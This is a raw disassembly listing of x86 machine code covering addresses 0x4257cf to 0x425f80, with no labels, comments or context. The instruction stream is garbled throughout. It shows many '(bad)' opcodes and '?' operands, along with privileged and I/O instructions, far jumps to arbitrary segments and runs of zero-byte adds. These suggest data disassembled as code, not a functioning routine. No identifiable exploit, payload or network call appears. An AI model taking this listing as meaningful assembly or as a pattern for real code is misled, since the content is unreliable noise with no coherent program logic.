  4257cf:	popf   
  4257d0:	sbb    eax,0x817eb190
  4257d5:	pushf  
  4257d6:	adc    esi,DWORD PTR [ebp+0x2e]
  4257d9:	les    ebx,FWORD PTR [eax+0x6e]
  4257dc:	sub    al,0xe1
  4257de:	mov    al,0x80
  4257e0:	ret    0x43d9
  4257e3:	jne    0x4257fd
  4257e5:	jmp    0x5e3d3f9a
  4257ea:	stos   DWORD PTR es:[edi],eax
  4257eb:	fisttp DWORD PTR [esi]
  4257ed:	xchg   esi,eax
  4257ee:	mov    al,0x60
  4257f0:	xchg   esi,eax
  4257f1:	std    
  4257f2:	inc    ebx
  4257f3:	jne    0x4257a2
  4257f5:	ror    DWORD PTR [ebx],0x35
  4257f8:	dec    ebp
  4257f9:	shl    BYTE PTR [esi],cl
  4257fb:	jge    0x42583f
  4257fd:	pusha  
  4257fe:	inc    esi
  4257ff:	mov    DWORD PTR [ebp+0x4285c7dc],esp
  425805:	jmp    0x2a04a258
  42580a:	jl     0x425883
  42580c:	cdq    
  42580d:	fsubr  QWORD PTR [esi+0x0]
  425813:	add    BYTE PTR [eax+0x7139a212],al
  425819:	push   ecx
  42581a:	call   0x4f04:0x290eb119
  425821:	dec    ecx
  425822:	sub    al,0xc2
  425824:	jns    0x425828
  425826:	sbb    al,0x7b
  425828:	shr    DWORD PTR [ebx+0x40a84be4],1
  42582e:	add    cl,ch
  425830:	jp     0x425867
  425832:	xchg   DWORD PTR [ecx+ecx*8],ecx
  425835:	push   edx
  425836:	je     0x425811
  425838:	fimul  WORD PTR [ebp+0x7e0a5e41]
  42583e:	rcr    ch,0x5b
  425841:	test   eax,0xe4ef9d35
  425846:	inc    DWORD PTR [ebp+0x7c]
  425849:	xchg   edx,eax
  42584a:	adc    DWORD PTR [ecx+0x6cf07d76],ebp
  425850:	retf   
  425851:	sub    eax,0xfe38f255
  425856:	je     0x425811
  425858:	shr    DWORD PTR [edi],cl
  42585a:	sbb    BYTE PTR [esi],bl
  42585c:	inc    ebx
  42585d:	push   cs
  42585e:	sti    
  42585f:	lahf   
  425860:	xchg   BYTE PTR [edi+0x2e1bdd72],ah
  425866:	or     al,0x6
  425868:	jl     0x4258d8
  42586a:	adc    BYTE PTR [ecx-0x2682dc8a],ch
  425870:	jbe    0x4258a0
  425872:	sub    eax,0x8311b96
  425877:	out    0x0,al
  425879:	add    BYTE PTR [eax],al
  42587b:	add    BYTE PTR [eax],al
  42587d:	pop    ebp
  42587e:	ret    0x2910
  425881:	jno    0x42589f
  425883:	add    dh,dl
  425885:	push   0x8cd186fa
  42588a:	push   cs
  42588b:	dec    edi
  42588c:	(bad)  
  42588d:	jge    0x425825
  42588f:	adc    al,0x29
  425891:	jno    0x425842
  425893:	fcom   st(2)
  425895:	ss push eax
  425897:	sti    
  425898:	aaa    
  425899:	or     esp,esp
  42589b:	mov    BYTE PTR [edi],ch
  42589d:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  42589f:	adc    eax,0x4266a5
  4258a4:	ss (bad) 
  4258a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4258a7:	(bad)
  4258aa:	dec    edx
  4258ab:	out    0x0,eax
  4258ad:	jmp    0x5b52ce06
  4258b2:	jmp    0x1458:0xa4b530b
  4258b9:	pushf  
  4258ba:	(bad)  
  4258bb:	push   ebp
  4258bc:	pop    ebx
  4258bd:	mov    ecx,0x1000cc1
  4258c2:	sub    esp,ebp
  4258c4:	mov    esp,DWORD PTR [ebx]
  4258c6:	jg     0x4258c9
  4258c8:	add    BYTE PTR [esi+edi*2-0x6f1f14],bl
  4258cf:	call   DWORD PTR [edx+0x2]
  4258d2:	jnp    0x425894
  4258d4:	je     0x425886
  4258d6:	or     DWORD PTR [eax],eax
  4258d8:	push   eax
  4258d9:	pop    ebx
  4258da:	or     ah,BYTE PTR [eax]
  4258dc:	adc    ecx,esp
  4258de:	(bad)  
  4258df:	cmp    al,0x2
  4258e1:	add    BYTE PTR [eax],al
  4258e3:	add    BYTE PTR [eax],al
  4258e5:	add    BYTE PTR [ebp-0x1ff10001],cl
  4258eb:	ins    BYTE PTR es:[edi],dx
  4258ec:	add    BYTE PTR [eax],al
  4258ee:	pop    esp
  4258ef:	adc    BYTE PTR [edi-0xb284],0x8a
  4258f6:	pop    edi
  4258f7:	mov    BYTE PTR [ebx-0x72aab45b],dl
  4258fd:	mov    ch,0x3e
  4258ff:	pop    eax
  425900:	idiv   edi
  425902:	and    al,0xbf
  425904:	adc    edi,edi
  425906:	sbb    edi,ebx
  425908:	mov    DWORD PTR [ecx],eax
  42590a:	sbb    al,0xff
  42590c:	popa   
  42590d:	adc    al,0x6c
  42590f:	or     BYTE PTR [eax],al
  425911:	lea    esp,[ecx+0x7e]
  425914:	jnp    0x4258de
  425916:	fild   DWORD PTR [ebp+0x54ca71b4]
  42591c:	test   eax,eax
  42591e:	pop    edx
  42591f:	repz add dh,0x3c
  425923:	push   es
  425924:	mov    eax,0x8cfe4fcd
  425929:	test   DWORD PTR [ebp-0x57],esi
  42592c:	stos   BYTE PTR es:[edi],al
  42592d:	sti    
  42592e:	jmp    0xad7b:0x4f639be8
  425935:	test   DWORD PTR [ebp-0x63f6d6d],esi
  42593b:	pop    eax
  42593c:	xor    ecx,DWORD PTR [ecx]
  42593e:	xchg   BYTE PTR [ecx+0x22],bl
  425941:	mov    eax,edi
  425943:	test   al,0xaa
  425945:	sti    
  425946:	mov    edx,0x19a61
  42594b:	add    BYTE PTR [eax],al
  42594d:	add    BYTE PTR [eax],al
  42594f:	jne    0x4258ea
  425951:	jp     0x4258d8
  425953:	push   edi
  425954:	push   eax
  425955:	lods   eax,DWORD PTR ds:[esi]
  425956:	sti    
  425957:	mov    ebx,0x2c3fff98
  42595c:	outs   dx,BYTE PTR ds:[esi]
  42595d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42595e:	push   ecx
  42595f:	add    BYTE PTR [esi],dl
  425961:	or     al,0xfb
  425963:	mov    dl,bl
  425965:	push   ebx
  425966:	push   0x28f471f0
  42596b:	lea    ecx,ds:0x8672faea
  425971:	inc    ebx
  425972:	pop    edx
  425973:	ret    
  425974:	ds inc ebx
  425976:	test   al,0xcf
  425978:	stos   DWORD PTR es:[edi],eax
  425979:	dec    edi
  42597a:	sti    
  42597b:	sub    BYTE PTR [ebx+0x15],0x40
  42597f:	jne    0x4259ad
  425981:	enter  0x4a0c,0x19
  425985:	sti    
  425986:	mov    eax,?
  425988:	add    ebp,DWORD PTR [ebp+0x32133afb]
  42598e:	test   al,0xfc
  425990:	out    dx,al
  425991:	jae    0x42598e
  425993:	sbb    BYTE PTR [ebx+0x1675400e],0x42
  42599a:	lock lds ebp,FWORD PTR [esi]
  42599d:	inc    edx
  42599e:	test   al,0xa5
  4259a0:	inc    ebp
  4259a1:	add    al,0x68
  4259a3:	jmp    0xf0429d7c
  4259a8:	add    ch,BYTE PTR [ebx+edx*1-0x8]
  4259ac:	mov    eax,ds:0x62dd539a
  4259b1:	inc    esi
  4259b2:	lods   al,BYTE PTR ds:[esi]
  4259b3:	add    BYTE PTR [eax],al
  4259b5:	add    BYTE PTR [eax],al
  4259b7:	add    dh,ch
  4259b9:	xchg   DWORD PTR [ecx-0x572b86ca],ebp
  4259bf:	cwde   
  4259c0:	mov    ch,BYTE PTR [ecx+ebx*8]
  4259c3:	jle    0x4259fd
  4259c5:	xchg   edx,eax
  4259c6:	sbb    DWORD PTR [ecx-0x23],edx
  4259c9:	lea    eax,[edx]
  4259cb:	scas   al,BYTE PTR es:[edi]
  4259cc:	mov    esi,0x7500512a
  4259d1:	add    bl,BYTE PTR [edx+0x34]
  4259d4:	and    DWORD PTR [ecx+0x427be3fc],0x16b586e9
  4259de:	(bad)  
  4259df:	sbb    DWORD PTR [ebp-0x5f],esi
  4259e2:	imul   BYTE PTR [eax+ebp*2+0x7543d87a]
  4259e9:	lea    esi,[esi]
  4259eb:	fwait
  4259ec:	shl    BYTE PTR [esi+0x22],cl
  4259ef:	lods   al,BYTE PTR ds:[esi]
  4259f0:	xchg   edx,eax
  4259f1:	int    0x59
  4259f3:	add    cl,bh
  4259f5:	cmp    eax,0x8dc0c020
  4259fa:	std    
  4259fb:	jg     0x425a56
  4259fd:	call   0x1992:0x38959f66
  425a04:	je     0x4259a7
  425a06:	fsub   QWORD PTR [edi]
  425a08:	jnp    0x425a4c
  425a0a:	jmp    0x49399862
  425a0f:	push   ss
  425a10:	mov    ch,0x2
  425a12:	(bad)  
  425a14:	(bad)  
  425a15:	int    0x26
  425a17:	add    al,0xf2
  425a19:	(bad)  
  425a1b:	adc    al,0x0
  425a1d:	add    BYTE PTR [eax],al
  425a1f:	add    BYTE PTR [eax],al
  425a21:	mov    ch,0x2
  425a23:	ret    0xf2d3
  425a26:	(bad)  
  425a27:	adc    al,0x10
  425a29:	mov    ch,0x2
  425a2b:	add    dl,al
  425a2d:	mov    ah,0x87
  425a2f:	shl    BYTE PTR ds:0xcd4489aa,0x66
  425a36:	fld    DWORD PTR [ecx+edi*1]
  425a39:	xor    ah,cl
  425a3b:	call   FWORD PTR [ebx]
  425a3d:	in     al,0x1f
  425a3f:	jl     0x425a06
  425a41:	jb     0x4259e1
  425a43:	jne    0x425a1c
  425a45:	push   ecx
  425a46:	cmp    al,bh
  425a48:	sub    bh,BYTE PTR [ecx+0x28]
  425a4b:	add    DWORD PTR [esi-0x7b],esi
  425a4e:	out    0x1b,al
  425a50:	in     al,0x72
  425a52:	add    eax,DWORD PTR [eax]
  425a54:	jmp    0xab09a4b7
  425a59:	jbe    0x425a05
  425a5b:	neg    BYTE PTR [esi-0x22]
  425a5e:	pushf  
  425a5f:	xchg   esp,ebx
  425a61:	cs leave 
  425a63:	aas    
  425a64:	jmp    0xe866dd87
  425a69:	jbe    0x425a6d
  425a6b:	sti    
  425a6c:	cld    
  425a6d:	cmp    cl,cl
  425a6f:	aas    
  425a70:	jmp    0xe9a90f44
  425a75:	pop    eax
  425a76:	add    ah,BYTE PTR [esi+0x1e]
  425a79:	in     al,dx
  425a7a:	inc    esi
  425a7b:	and    al,0xf1
  425a7d:	(bad)  
  425a7e:	fwait
  425a7f:	shr    BYTE PTR [edx+0x11],cl
  425a82:	pushf  
  425a83:	jne    0x425ad5
  425a85:	add    BYTE PTR [eax],al
  425a87:	add    BYTE PTR [eax],al
  425a89:	add    BYTE PTR [edx-0x35],ah
  425a8c:	test   DWORD PTR [ecx],ebp
  425a8e:	mov    esi,0xbf29940b
  425a93:	xchg   ebp,esp
  425a95:	mov    WORD PTR [ebx],?
  425a97:	ss xchg ebp,edx
  425a9a:	icebp  
  425a9b:	scas   al,BYTE PTR es:[edi]
  425a9c:	mov    cl,ch
  425a9e:	jbe    0x425aa2
  425aa0:	push   edx
  425aa1:	ficom  WORD PTR ds:0xaace6208
  425aa8:	loop   0x425aaa
  425aaa:	iret   
  425aab:	imul   esi,edi,0x89c38b0f
  425ab1:	inc    ebp
  425ab2:	enter  0x13b,0xf
  425ab6:	cdq    
  425ab7:	inc    ecx
  425ab8:	add    DWORD PTR [eax],eax
  425aba:	or     al,0x1b
  425abc:	inc    ebp
  425abd:	clc    
  425abe:	lods   al,BYTE PTR ds:[esi]
  425abf:	imul   esi,DWORD PTR [ebp+0x8],0x3
  425ac3:	repz add edx,DWORD PTR ds:0xc085068c
  425aca:	fdiv   DWORD PTR [edi+0x44610265]
  425ad0:	push   eax
  425ad1:	push   eax
  425ad2:	inc    ebx
  425ad3:	shl    bh,cl
  425ad5:	lea    ebx,[ebx+0xb8b4baa]
  425adb:	fmul   DWORD PTR [ebp+ecx*4-0x8936c]
  425ae2:	xor    al,0xe3
  425ae4:	sbb    al,BYTE PTR [eax]
  425ae6:	mov    WORD PTR [edx],ds
  425ae8:	test   DWORD PTR [eax+0x33],edi
  425aeb:	ins    BYTE PTR es:[edi],dx
  425aec:	not    DWORD PTR [eax+0x0]
  425aef:	add    BYTE PTR [eax],al
  425af1:	add    BYTE PTR [eax],al
  425af3:	and    al,0x49
  425af5:	inc    BYTE PTR [bp+di+0x1b]
  425af9:	inc    ebp
  425afa:	push   DWORD PTR [edi]
  425afc:	lahf   
  425afd:	rol    DWORD PTR [ebp+0x53],0x3
  425b01:	cmp    BYTE PTR [ebp-0x6d],0x3
  425b05:	xor    DWORD PTR ds:0x3ff66c,0x8
  425b0c:	fsubp  st(5),st
  425b0e:	inc    ebp
  425b0f:	pop    eax
  425b10:	hlt    
  425b11:	je     0x425b56
  425b13:	push   ebx
  425b14:	ror    DWORD PTR [ebx],1
  425b16:	jmp    FWORD PTR [edx-0x64]
  425b19:	scas   al,BYTE PTR es:[edi]
  425b1a:	inc    ebx
  425b1b:	and    BYTE PTR [esi+ebp*4-0x1f3bbbb5],bl
  425b22:	adc    BYTE PTR [edi],ah
  425b24:	les    eax,FWORD PTR [edi]
  425b26:	mov    bh,0x75
  425b28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b29:	dec    edi
  425b2a:	or     ebp,edx
  425b2c:	jmp    0x425b2d
  425b2e:	rcl    BYTE PTR ds:0xa5c0fcb9,0x60
  425b35:	xor    DWORD PTR [eax],ecx
  425b37:	or     bl,dh
  425b39:	sti    
  425b3a:	cli    
  425b3b:	push   0x75401021
  425b40:	les    esi,FWORD PTR cs:[esi+eax*4-0xd]
  425b45:	pop    ds
  425b46:	sti    
  425b47:	bound  esp,QWORD PTR [ebp-0x636aea58]
  425b4d:	aas    
  425b4e:	add    al,dh
  425b50:	push   0xa90583f9
  425b55:	(bad)  
  425b56:	inc    DWORD PTR [eax]
  425b58:	add    BYTE PTR [eax],al
  425b5a:	add    BYTE PTR [eax],al
  425b5c:	frstor [eax]
  425b5e:	mov    ds:0xc424c2fb,eax
  425b63:	je     0x425bb8
  425b65:	adc    al,0x41
  425b67:	adc    BYTE PTR [edi],bl
  425b69:	cdq    
  425b6a:	push   esp
  425b6b:	add    eax,0xffffaa81
  425b70:	inc    ebp
  425b71:	inc    ecx
  425b72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b73:	gs fwait
  425b75:	inc    edi
  425b76:	test   eax,0xcde08173
  425b7b:	sti    
  425b7c:	add    BYTE PTR [ecx+0x5782fc1d],ah
  425b82:	idiv   edx
  425b84:	ret    0xff10
  425b87:	push   DWORD PTR [ebp-0x4]
  425b8a:	or     bl,al
  425b8c:	sub    DWORD PTR [ebx-0x1],0xe7783584
  425b93:	addr16 dec ebp
  425b95:	test   eax,0x1552ffff
  425b9a:	repz cli 
  425b9c:	pusha  
  425b9d:	retf   
  425b9e:	adc    al,0x40
  425ba0:	jne    0x425bc8
  425ba2:	les    esi,FWORD PTR [ebp+0x64]
  425ba5:	add    ch,BYTE PTR [esi+0x40]
  425ba8:	test   DWORD PTR [edx+0x275dfa1],eax
  425bae:	jmp    0x5f3b03b5
  425bb3:	ds push ds
  425bb5:	stos   BYTE PTR es:[edi],al
  425bb6:	and    DWORD PTR [esi],ebx
  425bb8:	jne    0x425b49
  425bba:	jb     0x425be3
  425bbc:	je     0x425bc0
  425bbe:	jmp    0x425c6b
  425bc3:	add    BYTE PTR [eax],al
  425bc5:	inc    edi
  425bc6:	popf   
  425bc7:	aam    0x8b
  425bc9:	fs inc edx
  425bcb:	jmp    0x9aa33a6b
  425bd0:	test   al,0xf2
  425bd2:	inc    edi
  425bd3:	in     eax,0xb0
  425bd5:	xor    eax,0x7503e8e6
  425bda:	inc    edx
  425bdb:	cld    
  425bdc:	out    dx,al
  425bdd:	inc    ebx
  425bde:	sub    DWORD PTR [ecx+0x2c8f3aff],0xd49d25a0
  425be8:	xor    esp,DWORD PTR [ecx+0x42]
  425beb:	jmp    0xa4d1d30d
  425bf0:	lahf   
  425bf1:	inc    ebp
  425bf2:	popf   
  425bf3:	call   0x80a8:0xe902744f
  425bfa:	sub    bl,ch
  425bfc:	inc    ebx
  425bfd:	jne    0x425c27
  425bff:	jmp    0x259f:0xac8f731d
  425c06:	popf   
  425c07:	jb     0x425c58
  425c09:	je     0x425c0d
  425c0b:	jmp    0xf570e4b8
  425c10:	inc    ebx
  425c11:	jne    0x425c65
  425c13:	call   0x280e1b60
  425c18:	sti    
  425c19:	pop    edx
  425c1a:	outs   dx,BYTE PTR ss:[esi]
  425c1c:	xchg   edi,eax
  425c1d:	shl    BYTE PTR [esi-0x1a67bff],cl
  425c23:	call   FWORD PTR [ecx+0x62ee85a4]
  425c29:	add    BYTE PTR [eax],al
  425c2b:	add    BYTE PTR [eax],al
  425c2d:	add    BYTE PTR [esi+esi*8-0x218651ae],dh
  425c34:	(bad)  
  425c35:	call   0xfdb4f5b0
  425c3a:	mov    eax,ds:0xc1f9244e
  425c3f:	cdq    
  425c40:	adc    eax,0x426559
  425c45:	xor    DWORD PTR fs:[ecx],ecx
  425c48:	test   BYTE PTR [edi+0x79],dl
  425c4b:	add    al,BYTE PTR [eax]
  425c4d:	bound  edi,QWORD PTR [ebx]
  425c4f:	test   BYTE PTR [esi-0x3e702acf],0xe9
  425c56:	jbe    0x425c5a
  425c58:	inc    eax
  425c59:	sbb    eax,0xe57a8f74
  425c5e:	inc    DWORD PTR [esi]
  425c60:	xchg   edi,eax
  425c62:	test   eax,0x1b07624
  425c68:	add    cl,ch
  425c6a:	pushw  ss
  425c6c:	bound  ebp,QWORD PTR ds:[edx+edx*1+0x14]
  425c71:	test   eax,0x297f3176
  425c76:	test   DWORD PTR [edx],esi
  425c78:	lea    ebp,[ebp+0x4e4ff8c2]
  425c7e:	mov    BYTE PTR [esi-0x3e1a0940],0x84
  425c85:	sub    DWORD PTR [edi+ebp*8-0x7a],eax
  425c89:	scas   eax,DWORD PTR es:[edi]
  425c8a:	jb     0x425ca9
  425c8c:	rcl    ch,0x26
  425c8f:	cdq    
  425c90:	adc    eax,0xcd
  425c95:	add    BYTE PTR [eax],al
  425c97:	test   DWORD PTR [edx+0x0],eax
  425c9a:	xor    DWORD PTR fs:[edi],edx
  425c9d:	dec    esi
  425c9e:	bound  esp,QWORD PTR [ebx+0x316a52f6]
  425ca4:	pop    es
  425ca5:	push   eax
  425ca6:	add    cl,cl
  425ca8:	inc    edx
  425ca9:	and    al,0x1c
  425cab:	in     al,dx
  425cac:	fs retf 
  425cae:	test   DWORD PTR [ebx+edx*4+0x77c094],ecx
  425cb5:	sub    al,al
  425cb7:	mov    al,ds:0x4b3674bf
  425cbc:	out    dx,al
  425cbd:	adc    ecx,DWORD PTR [ebx+0x24746512]
  425cc3:	sbb    al,0x19
  425cc5:	xlat   BYTE PTR ds:[ebx]
  425cc6:	call   0x39c7f1
  425ccb:	xchg   DWORD PTR [ebp-0x658f8b0a],ebx
  425cd1:	mov    BYTE PTR [eax+esi*2-0xe],al
  425cd5:	add    BYTE PTR [esi-0x10],0x1e
  425cd9:	inc    esp
  425cda:	and    al,0xc4
  425cdc:	fs adc eax,0x3fe148
  425ce2:	test   DWORD PTR [esp+ebp*8],ecx
  425ce5:	add    dl,BYTE PTR [eax+0x49]
  425ce8:	(bad)  [ebx]
  425cea:	adc    al,0x6c
  425cec:	jle    0x425d2b
  425cee:	mov    dl,0x4a
  425cf0:	fs push edi
  425cf2:	pop    esi
  425cf3:	jl     0x425cfb
  425cf5:	push   ebx
  425cf6:	mov    eax,DWORD PTR [ecx+0x4a]
  425cf9:	mov    ebx,0x83
  425cfe:	add    BYTE PTR [eax],al
  425d00:	dec    ebx
  425d01:	lahf   
  425d02:	ins    DWORD PTR es:[edi],dx
  425d03:	add    eax,0x7676640f
  425d08:	xchg   edi,eax
  425d09:	sbb    bh,BYTE PTR [edi+0x60]
  425d0c:	cmp    esp,DWORD PTR [edi+esi*8-0x7d]
  425d10:	xor    al,0x44
  425d12:	outs   dx,DWORD PTR ds:[esi]
  425d13:	add    al,0xb2
  425d15:	sbb    BYTE PTR [edi+0x255c17c3],bh
  425d1b:	add    BYTE PTR [edi+edi*8-0xa],bl
  425d1f:	cmp    eax,0xffff5c
  425d24:	jne    0x425da3
  425d26:	xchg   ebp,eax
  425d27:	push   edx
  425d28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d29:	repz imul eax,DWORD PTR [ebx],0x76
  425d2d:	test   eax,0x5a718cff
  425d32:	mov    WORD PTR [edi],fs
  425d34:	aaa    
  425d35:	cli    
  425d36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d37:	or     eax,DWORD PTR [edx]
  425d39:	mov    ch,0x80
  425d3b:	clc    
  425d3c:	retf   0x3e9
  425d3f:	aaa    
  425d40:	inc    edx
  425d41:	cmp    bl,bh
  425d43:	mov    WORD PTR [ebp-0x5cfa6756],fs
  425d49:	mov    al,ds:0x124872
  425d4e:	mov    dl,0x7d
  425d50:	sub    ebx,DWORD PTR [eax+0x4b365abf]
  425d56:	jns    0x425d5c
  425d58:	lock dec esi
  425d5a:	dec    ebp
  425d5b:	inc    eax
  425d5c:	jne    0x425da1
  425d5e:	rcl    DWORD PTR [ebp-0x2],0x8c
  425d62:	dec    edi
  425d63:	dec    edi
  425d64:	add    BYTE PTR [eax],al
  425d66:	add    BYTE PTR [eax],al
  425d68:	add    BYTE PTR [edx+0x20],cl
  425d6b:	lods   al,BYTE PTR ds:[esi]
  425d6c:	das    
  425d6d:	mov    ch,0xb0
  425d6f:	cmp    cl,BYTE PTR [edx+eax*4]
  425d72:	les    ecx,FWORD PTR ds:[eax-0x70]
  425d76:	test   eax,0x21b5ffff
  425d7b:	cmp    edi,esp
  425d7d:	xchg   DWORD PTR [ecx-0xb],ebp
  425d80:	mov    cl,0xbd
  425d82:	loope  0x425d6b
  425d84:	int3   
  425d85:	(bad)  
  425d86:	lds    edi,FWORD PTR [edi]
  425d88:	add    BYTE PTR [ecx],ch
  425d8a:	bound  esp,QWORD PTR [ebp+0x315159c0]
  425d90:	jmp    0xabae:0x8519e046
  425d97:	jnp    0x425d29
  425d99:	jne    0x425d44
  425d9b:	(bad)  
  425d9c:	cli    
  425d9d:	add    BYTE PTR [ebp+0x2febf79],bh
  425da3:	xor    ebx,DWORD PTR [eax+edi*1+0x6ea51bbf]
  425daa:	push   eax
  425dab:	push   cs
  425dac:	sbb    dh,BYTE PTR [ebp+0x31]
  425daf:	or     cl,BYTE PTR [edi]
  425db1:	fldz   
  425db3:	test   al,0x3
  425db5:	lock ret 0xfa75
  425db9:	outs   dx,DWORD PTR ds:[esi]
  425dba:	push   eax
  425dbb:	sub    ebx,eax
  425dbd:	push   ebp
  425dbe:	repz fistp QWORD PTR [esi]
  425dc1:	xor    DWORD PTR [esi+0x4327142b],ecx
  425dc7:	test   DWORD PTR [ebx+0x43daeba9],0x0
  425dd1:	add    BYTE PTR [edx+eax*4+0x3e2e154],al
  425dd8:	into   
  425dd9:	loop   0x425e5a
  425ddb:	push   eax
  425ddc:	test   eax,0xac06c4f4
  425de1:	push   es
  425de2:	xchg   ecx,eax
  425de3:	inc    edx
  425de4:	jmp    0xac4182dd
  425de9:	pop    es
  425dea:	push   ecx
  425deb:	inc    edx
  425dec:	jmp    0xe1e6120e
  425df1:	sbb    eax,0x6cdaca72
  425df6:	lods   al,BYTE PTR ds:[esi]
  425df7:	lods   eax,DWORD PTR ds:[esi]
  425df8:	dec    ecx
  425df9:	icebp  
  425dfa:	or     dl,dh
  425dfc:	scas   eax,DWORD PTR es:[edi]
  425dfd:	jmp    0x425e30
  425dff:	push   es
  425e00:	std    
  425e01:	cmc    
  425e02:	test   dl,0xda
  425e05:	mov    ?,WORD PTR [edi+eax*4+0x37576ed]
  425e0c:	jmp    0x6d48f814
  425e11:	ret    
  425e12:	outs   dx,BYTE PTR ds:[esi]
  425e13:	outs   dx,DWORD PTR ds:[esi]
  425e14:	sub    BYTE PTR [esi+0x79],dh
  425e17:	xchg   eax,ebp
  425e19:	add    dh,BYTE PTR [ebp+0x2]
  425e1c:	cmp    ch,BYTE PTR [esi]
  425e1e:	xor    DWORD PTR [ecx],0xfd19900
  425e24:	or     BYTE PTR [esi],ch
  425e26:	or     DWORD PTR [edx-0x6a8956ec],0xffffffd8
  425e2d:	add    bh,BYTE PTR [ecx]
  425e2f:	xchg   ebp,eax
  425e30:	fadd   DWORD PTR [edx]
  425e32:	sbb    WORD PTR [ebp-0x23],di
  425e36:	add    BYTE PTR [eax],al
  425e38:	add    BYTE PTR [eax],al
  425e3a:	add    BYTE PTR [esi+0xe],dh
  425e3d:	sub    BYTE PTR [ecx],dl
  425e3f:	add    BYTE PTR [ebx+edi*8-0x3fabb902],bl
  425e46:	(bad)  
  425e47:	mov    ebx,0xadd274c2
  425e4c:	dec    esp
  425e4d:	adc    bh,bl
  425e4f:	mov    al,0x8
  425e51:	adc    BYTE PTR [ebp+0x6e],0x83
  425e55:	dec    ebp
  425e56:	aad    0x71
  425e58:	add    al,BYTE PTR [eax]
  425e5a:	or     esi,edx
  425e5c:	push   cs
  425e5d:	cld    
  425e5e:	sbb    DWORD PTR [ecx-0x68],ebx
  425e61:	add    cl,ch
  425e63:	jbe    0x425e06
  425e65:	sar    ebx,0x36
  425e68:	cmp    eax,0x9bba057
  425e6d:	add    BYTE PTR [ebx+0x39],dh
  425e70:	inc    ebx
  425e71:	and    BYTE PTR [eax+0x69140e78],0xf8
  425e78:	xchg   edi,eax
  425e79:	je     0x425e61
  425e7b:	stos   DWORD PTR es:[edi],eax
  425e7c:	leave  
  425e7d:	bound  esi,QWORD PTR [eax+0x7b]
  425e80:	mov    eax,ds:0xfde06908
  425e85:	je     0x425e71
  425e87:	repz idiv edi
  425e8a:	bound  eax,QWORD PTR [ecx-0x2e]
  425e8d:	test   DWORD PTR [ecx-0x25382fcf],ebp
  425e93:	js     0x425e15
  425e95:	shl    esi,0x3c
  425e98:	ret    0x4e50
  425e9b:	ins    DWORD PTR es:[edi],dx
  425e9c:	fiadd  WORD PTR [edi]
  425e9e:	add    BYTE PTR [eax],al
  425ea0:	add    BYTE PTR [eax],al
  425ea2:	add    BYTE PTR [eax],al
  425ea4:	out    dx,al
  425ea5:	ins    BYTE PTR es:[edi],dx
  425ea6:	hlt    
  425ea7:	bound  eax,QWORD PTR [edx+0x65]
  425eaa:	mov    edx,0x82d98c04
  425eaf:	in     al,dx
  425eb0:	or     eax,0x1bb706cf
  425eb5:	or     al,0x4b
  425eb7:	mov    ah,BYTE PTR [ebx]
  425eb9:	mov    ah,0x51
  425ebb:	btc    ecx,edi
  425ebe:	(bad)  
  425ebf:	bts    ebp,eax
  425ec2:	lea    esi,[edx+eax*2+0x65]
  425ec6:	pop    es
  425ec7:	scas   eax,DWORD PTR es:[edi]
  425ec8:	test   bl,dh
  425eca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ecb:	lock push ebx
  425ecd:	cmp    eax,0x650188ca
  425ed2:	pop    es
  425ed3:	mov    dh,0x59
  425ed5:	arpl   WORD PTR [esi+0xf],bx
  425ed8:	repz dec edx
  425eda:	or     al,0xf
  425edc:	cli    
  425edd:	pop    eax
  425ede:	sti    
  425edf:	icebp  
  425ee0:	pop    ds
  425ee1:	mov    BYTE PTR [edi],0xaf
  425ee4:	iret   
  425ee5:	hlt    
  425ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ee7:	retf   
  425ee8:	test   DWORD PTR [edx],esi
  425eea:	clc    
  425eeb:	(bad)  
  425eed:	ret    
  425eee:	xor    ecx,esi
  425ef0:	ror    DWORD PTR [eax+ebx*4+0x703dc00],cl
  425ef7:	mov    bh,0xc
  425ef9:	xchg   DWORD PTR [ebp+0x10],eax
  425efc:	push   edi
  425efd:	inc    esp
  425efe:	adc    al,0x83
  425f00:	jns    0x425ef4
  425f02:	inc    DWORD PTR [edx]
  425f04:	adc    eax,0x107d81
  425f09:	add    BYTE PTR [eax],al
  425f0b:	add    BYTE PTR [eax],al
  425f0d:	int3   
  425f0e:	stc    
  425f0f:	sbb    eax,0x82f2898b
  425f14:	push   ebp
  425f15:	xchg   esp,eax
  425f16:	add    BYTE PTR [ebx-0x1733d8b0],bh
  425f1c:	pop    ecx
  425f1d:	inc    ebx
  425f1e:	test   DWORD PTR fs:[edi],0x41467775
  425f25:	je     0x425f85
  425f27:	pop    es
  425f28:	or     eax,ebx
  425f2a:	push   0xa53800cf
  425f2f:	mov    al,BYTE PTR [ebp+0x69]
  425f32:	xchg   esp,eax
  425f33:	dec    eax
  425f34:	adc    bh,ah
  425f36:	xrelease mov DWORD PTR [ebx-0x73],ecx
  425f3a:	adc    eax,DWORD PTR [esi+0x41]
  425f3d:	jbe    0x425fa5
  425f3f:	xchg   edi,eax
  425f40:	cmp    al,0x74
  425f42:	jbe    0x425f36
  425f44:	xchg   BYTE PTR [eax+0x5ebf0299],bh
  425f4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f4b:	lea    ecx,[edi]
  425f4d:	in     eax,dx
  425f4e:	mov    ecx,0xf17e3f44
  425f53:	adc    al,0xf2
  425f55:	push   ds
  425f56:	push   ebp
  425f57:	(bad)  
  425f59:	mov    eax,ds:0x85458c9c
  425f5e:	lods   al,BYTE PTR ds:[esi]
  425f5f:	(bad)  
  425f60:	out    0x73,eax
  425f62:	and    esi,ebp
  425f64:	xchg   DWORD PTR [edx+ebp*8+0x44],esp
  425f68:	aaa    
  425f69:	sub    eax,0x68e795db
  425f6e:	xchg   ebp,eax
  425f6f:	add    esi,DWORD PTR [ebp+0x0]
  425f72:	add    BYTE PTR [eax],al
  425f74:	add    BYTE PTR [eax],al
  425f76:	fs and al,0x43
  425f79:	adc    BYTE PTR [esi+0x6c],dh
  425f7c:	lods   eax,DWORD PTR ds:[esi]
  425f7d:	add    bh,bh
  425f7f:	fwait
  425f80:	xchg   DWORD PTR [ecx],edx
